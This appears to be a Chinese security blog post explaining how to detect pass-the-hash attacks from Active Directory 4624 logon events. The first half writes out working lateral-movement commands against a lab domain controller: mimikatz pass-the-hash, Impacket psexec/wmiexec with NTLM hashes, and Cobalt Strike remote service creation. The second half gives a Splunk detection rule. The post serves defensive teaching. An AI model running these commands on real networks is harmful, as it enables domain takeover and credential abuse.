#  基于AD Event日志检测哈希传递攻击

原创 Bypass [ Bypass ](javascript:void\(0\);)

**Bypass** ![]()

微信号 Bypass--

功能介绍 致力于分享原创高质量干货，包括但不限于：渗透测试、WAF绕过、代码审计、安全运维。 闻道有先后，术业有专攻，如是而已。

____

___发表于_

收录于合集

**01、简介**

哈希传递攻击是基于NTLM认证的一种攻击方式，当我们获得某个管理员用户的密码哈希值，就可以利用密码哈希值进行横向渗透。

在域环境中，只有域管理员的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。基于AD
Event日志如何检测哈希传递攻击，这个就是我们今天探讨的话题。

 **02、哈希传递攻击实例**

 **（1）使用mimikatz 进行哈希传递获取域控权限**

在域环境中，当我们获得了域管理员的NTLM哈希值，我们就可以访问域内任何一台服务器。

  *   *   *   * 

    
    
     #提权 privilege::debug #使用域管理员bypassu拍卖行及的NTLM值进行哈希传递攻击 sekurlsa::pth /user:bypass /domain:evil.com /ntlm:44f077e27f6fef69e7bd834c7242b040

![](https://gitee.com/fuli009/images/raw/master/public/20221208204539.png)

利用PsExec.exe来远程登录和执行命令

![](https://gitee.com/fuli009/images/raw/master/public/20221208204550.png)

 **（2）使用lmpacket工具包进行哈希传递获取域控权限**

lmpacket工具包集成了多个脚本，可用来进行哈希传递，如psexec.py、wmiexec.py。

  *   * 

    
    
    psexec.py  -hashes 00000000000000000000000000000000:44f077e27f6fef69e7bd834c7242b040 bypass@192.168.44.219wmiexec.py -hashes 00000000000000000000000000000000:44f077e27f6fef69e7bd834c7242b040 bypass@192.168.44.219

![](https://gitee.com/fuli009/images/raw/master/public/20221208204551.png)

 **(3) 通过Cobalt strike进行pth横向获取域控权限**

在已上线的机器中，使用先前获取的hash对目标域控进行哈希传递攻击，获取域控权限。

哈希传递  

  *   * 

    
    
    pth evil\bypass 44f077e27f6fef69e7bd834c7242b040shell dir \\192.168.44.219\c$

获取系统权限

  *   *   *   * 

    
    
    shell copy  C:\Users\administrator\Desktop\artifact.exe \\192.168.44.219\c$shell sc \\192.168.44.219 create test binpath=C:\artifact.exeshell sc \\192.168.44.219 start testshell sc \\192.168.44.219 delete test

![](https://gitee.com/fuli009/images/raw/master/public/20221208204553.png)

 **03、哈希传递攻击检测**

哈希传递攻击的检测其实是比较困难的，因为它总是和正常的访问行为非常类似，我们需要从域控收集的大量的安全日志中找到需要关心的事件和具体的值。

![](https://gitee.com/fuli009/images/raw/master/public/20221208204554.png)

分析：在使用NTLM凭证进行横向获取域控权限时，域控的日志中会记录4624登录事件，LogonType为3且登录进程为NtlmSsp，这里可以找到登录用户和登录源地址。为了能从正常的访问行为中，找出异常登录行为，我们可以设置白名单，将域控管理员和正常登录来源IP添加至白名单，关注关键用户的登录行为，排除干扰项。另外，当攻击者使用工具进行哈希传递的时候，比如使用psexec.py脚本进行哈希传递会同时产生多条LogonType为3且登录进程为NtlmSsp的日志，我们还可以将登录频率作为判断依据进行检测。

安全规则示例：

  *   * 

    
    
    eventtype=wineventlog_security   EventCode=4624   LogonProcessName=NtLmSsp   match_user!="*$"    src!="-"   match_user IN("administrator","bypass") | eval time=_time | bin time span=30m   | stats  count earliest(_time) AS start_time latest(_time) AS end_time values(src) as val_src  by time match_user  dest   | eval  start_time=strftime(start_time,"%F %T"),end_time=strftime(end_time,"%F %T")  | search count >5  | nomv val_src | eval message="在"+start_time+"到"+end_time+"时间内，域控服务器:"+dest +" 疑似遭受哈希传递攻击"+count+"次, 操作账号:"+match_user+" 操作来源ip:"+val_src| table  start_time   end_time  match_user message  count val_src  dest

告警效果如下图：

![](https://gitee.com/fuli009/images/raw/master/public/20221208204556.png)

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

